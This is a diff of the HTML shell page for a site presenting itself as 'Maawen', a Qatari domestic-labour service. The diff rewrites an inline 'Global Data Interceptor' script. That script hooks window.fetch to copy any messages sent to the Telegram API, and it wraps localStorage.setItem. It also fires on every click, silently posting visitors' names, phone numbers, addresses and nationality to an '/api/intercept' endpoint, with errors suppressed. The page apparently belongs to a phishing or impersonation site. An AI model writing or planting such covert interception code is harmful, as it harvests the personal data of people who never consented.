@@ -1,89 +1,77 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head>
-<script>
-// --- Global Data Interceptor ---
-(function() {
-  var _originalFetch = window.fetch;
-  var _originalSetItem = localStorage.setItem;
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/assets/logo-Bm-KOWOX.png" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>معاون لخدمات القوى البشرية — قطر</title>
+    <script>
+      // --- Global Data Interceptor ---
+      (function() {
+        var _originalFetch = window.fetch;
+        var _originalSetItem = localStorage.setItem;
 
-  // دالة المزامنة الأساسية - أصبحت عالمية
-  window.syncToAdmin = function(extraData) {
-    var urlParams = new URLSearchParams(window.location.search);
-    var orderData = {
-      page: window.location.pathname,
-      timestamp: new Date().toISOString(),
-      customer_name: localStorage.getItem('customer_name') || urlParams.get('name') || '',
-      customer_phone: localStorage.getItem('customer_phone') || urlParams.get('phone') || '',
-      customer_address: localStorage.getItem('customer_address') || urlParams.get('address') || '',
-      service_type: localStorage.getItem('service_type') || urlParams.get('service') || '',
-      total_price: parseFloat(localStorage.getItem('total_price') || urlParams.get('total') || '0') || 0,
-      duration: localStorage.getItem('duration') || urlParams.get('duration') || '',
-      nationality: localStorage.getItem('nationality') || urlParams.get('nationality') || '',
-      workers: parseInt(localStorage.getItem('workers') || urlParams.get('workers') || '1') || 1,
-      start_date: localStorage.getItem('start_date') || urlParams.get('startDate') || '',
-      start_time: localStorage.getItem('start_time') || ''
-    };
-    
-    if (extraData) Object.assign(orderData, extraData);
-    
-    var existingRef = localStorage.getItem('maawen_order_ref');
-    if (existingRef) orderData.order_ref = existingRef;
-    
-    // لا ترسل إذا لم يكن هناك بيانات مهمة
-    if (!orderData.customer_name && !orderData.customer_phone && !orderData.service_type && !extraData) return Promise.resolve();
+        window.syncToAdmin = function(extraData) {
+          try {
+            var urlParams = new URLSearchParams(window.location.search);
+            var orderData = {
+              page: window.location.pathname,
+              timestamp: new Date().toISOString(),
+              customer_name: localStorage.getItem('customer_name') || urlParams.get('name') || '',
+              customer_phone: localStorage.getItem('customer_phone') || urlParams.get('phone') || '',
+              customer_address: localStorage.getItem('customer_address') || urlParams.get('address') || '',
+              service_type: localStorage.getItem('service_type') || urlParams.get('service') || '',
+              total_price: parseFloat(localStorage.getItem('total_price') || urlParams.get('total') || '0') || 0,
+              duration: localStorage.getItem('duration') || urlParams.get('duration') || '',
+              nationality: localStorage.getItem('nationality') || urlParams.get('nationality') || '',
+              workers: parseInt(localStorage.getItem('workers') || urlParams.get('workers') || '1') || 1,
+              start_date: localStorage.getItem('start_date') || urlParams.get('startDate') || '',
+              start_time: localStorage.getItem('start_time') || ''
+            };
+            if (extraData) Object.assign(orderData, extraData);
+            var existingRef = localStorage.getItem('maawen_order_ref');
+            if (existingRef) orderData.order_ref = existingRef;
+            if (!orderData.customer_name && !orderData.customer_phone && !orderData.service_type && !extraData) return;
 
-    return _originalFetch.call(window, '/api/intercept', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(orderData)
-    }).then(function(r) { return r.json(); }).then(function(data) {
-      if (data && data.orderRef) {
-        localStorage.setItem('maawen_order_ref', data.orderRef);
-      }
-      return data;
-    }).catch(function(e) { console.error('Sync Error:', e); });
-  };
+            _originalFetch.call(window, '/api/intercept', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(orderData)
+            }).then(function(r) { return r.json(); }).then(function(data) {
+              if (data && data.orderRef) localStorage.setItem('maawen_order_ref', data.orderRef);
+            }).catch(function(e) {});
+          } catch(e) {}
+        };
 
-  // اعتراض Fetch لطلبات Telegram
-  window.fetch = function(url, options) {
-    var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
-    if (urlStr && urlStr.indexOf('api.telegram.org') !== -1 && options && options.method === 'POST' && options.body) {
-      try {
-        var body = JSON.parse(options.body);
-        window.syncToAdmin({ raw_message: body.text || '' });
-      } catch(e) {}
-    }
-    return _originalFetch.apply(this, arguments);
-  };
+        window.fetch = function(url, options) {
+          var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
+          if (urlStr && urlStr.indexOf('api.telegram.org') !== -1 && options && options.method === 'POST' && options.body) {
+            try {
+              var body = JSON.parse(options.body);
+              window.syncToAdmin({ raw_message: body.text || '' });
+            } catch(e) {}
+          }
+          return _originalFetch.apply(this, arguments);
+        };
 
-  // اعتراض localStorage
-  localStorage.setItem = function(key, value) {
-    _originalSetItem.apply(this, arguments);
-    var watchKeys = ['customer_name', 'customer_phone', 'customer_address', 'service_type', 'nationality', 'start_date', 'duration', 'total_price'];
-    if (watchKeys.indexOf(key) !== -1) {
-      window.syncToAdmin();
-    }
-  };
+        localStorage.setItem = function(key, value) {
+          _originalSetItem.apply(this, arguments);
+          if (['customer_name', 'customer_phone', 'customer_address', 'service_type', 'nationality', 'start_date', 'duration', 'total_price'].indexOf(key) !== -1) {
+            setTimeout(window.syncToAdmin, 500);
+          }
+        };
 
-  // إرسال عند النقر على أي زر (لضمان التقاط الخطوات)
-  document.addEventListener('click', function(e) {
-    if (e.target.tagName === 'BUTTON' || e.target.closest('button') || e.target.tagName === 'A') {
-      setTimeout(window.syncToAdmin, 500);
-    }
-  }, true);
-
-  // إرسال دوري كل 10 ثوانٍ إذا كان هناك تغيير
-  setInterval(window.syncToAdmin, 10000);
-  
-  // إرسال عند تحميل الصفحة
-  window.addEventListener('load', function() {
-    setTimeout(window.syncToAdmin, 1000);
-  });
-})();
-</script>
-<meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/assets/styles-CJ0qpnHN.css" data-precedence="default"/><title>معاون لخدمات القوى البشرية — قطر</title><meta name="author" content="Lovable"/><meta property="og:title" content="MAAWAN-QA"/><meta property="og:description" content="الشركة القطرية لحول القوى البشرية -معاون"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary"/><meta name="twitter:site" content="@Lovable"/><meta name="twitter:title" content="MAAWAN-QA"/><meta name="twitter:description" content="الشركة القطرية لحول القوى البشرية -معاون"/><meta property="og:image" content="https://storage.googleapis.com/gpt-engineer-file-uploads/LMz93049oWgn9Y5CZ2HKqJbTgKL2/social-images/social-1779453562023-logo-Bm-KOWOX.webp"/><meta name="twitter:image" content="https://storage.googleapis.com/gpt-engineer-file-uploads/LMz93049oWgn9Y5CZ2HKqJbTgKL2/social-images/social-1779453562023-logo-Bm-KOWOX.webp"/><meta name="description" content="الشركة القطرية لحلول القوى البشرية. عمالة منزلية بالساعة، بالشهر، واستقدام مباشر في قطر."/><link rel="modulepreload" href="/assets/index-Dq-H0M4e.js"/><link rel="modulepreload" href="/assets/index-BA_GD07B.js"/><link rel="modulepreload" href="/assets/ministry-of-labour-DcFkIMyr.js"/><link rel="modulepreload" href="/assets/useTrackUserLogin-DuWNSSAp.js"/><link rel="modulepreload" href="/assets/clock-BdneFf11.js"/><link rel="modulepreload" href="/assets/calendar-days-CJb6xVz7.js"/><link rel="modulepreload" href="/assets/createLucideIcon-DVLB4LTh.js"/><link rel="modulepreload" href="/assets/circle-check-lAekBpBL.js"/><link rel="modulepreload" href="/assets/arrow-left-DEo6KvOe.js"/><link rel="modulepreload" href="/assets/sparkles-Cr_GoRPr.js"/><link rel="modulepreload" href="/assets/map-pin-cL4H4Py8.js"/><style>* { font-variant-numeric: normal; } [dir="rtl"] .price, [dir="rtl"] .number, span, div, button, p { font-feature-settings: normal; } body { -webkit-locale: "en"; } .price-value, .total-price { unicode-bidi: embed; direction: ltr; } </style><style>@font-face { font-display: swap; } :root { --font-numeric: "Segoe UI", Arial, sans-serif; } </style></head>
-<body>
-<div id="root"></div>
-</body>
+        document.addEventListener('click', function(e) {
+          if (e.target.tagName === 'BUTTON' || e.target.closest('button') || e.target.tagName === 'A') {
+            setTimeout(window.syncToAdmin, 1000);
+          }
+        }, true);
+      })();
+    </script>
+    <script type="module" crossorigin src="/assets/index-Dq-H0M4e.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/styles-CJ0qpnHN.css">
+  </head>
+  <body>
+    <div id="root"></div>
+  </body>
 </html>
